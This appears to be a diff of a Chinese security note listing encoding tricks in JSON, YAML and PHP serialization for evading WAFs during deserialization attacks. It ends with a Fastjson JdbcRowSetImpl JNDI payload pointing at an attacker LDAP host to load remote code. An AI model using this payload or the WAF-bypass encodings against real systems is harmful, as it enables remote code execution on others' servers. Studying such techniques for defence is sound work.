@@ -1,5 +1,5 @@
 # 来自p师傅的知识星球
-》抽空整理了一下各种序列化方式中支持的一些编码方式，我们可以在遇到一些限制、WAF的时候使用这些编码进行绕过。
+>抽空整理了一下各种序列化方式中支持的一些编码方式，我们可以在遇到一些限制、WAF的时候使用这些编码进行绕过。
 
 ### JSON：
 json是最常用到的序列化方法，json中支持使用unicode编码，目标解析的时候会自动解码，
@@ -20,7 +20,7 @@ yaml的双引号中可以使用16进制编码和unicode编码，
 如`name: "\x23vulhub\u0023"`，单引号内不支持编码。
 
 ### php serialize：php的反序列化中，可以用一种长得像8进制编码，实际上是16进制编码的方式表示字符串，
-具体可以参考我在星球分享过的帖子： https://t.zsxq.com/3faIYzN​
+具体可以参考我在星球分享过的帖子：https://t.zsxq.com/3faIYzN
 
 ```
 {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP:7777/Exploit","autoCommit":true}}}
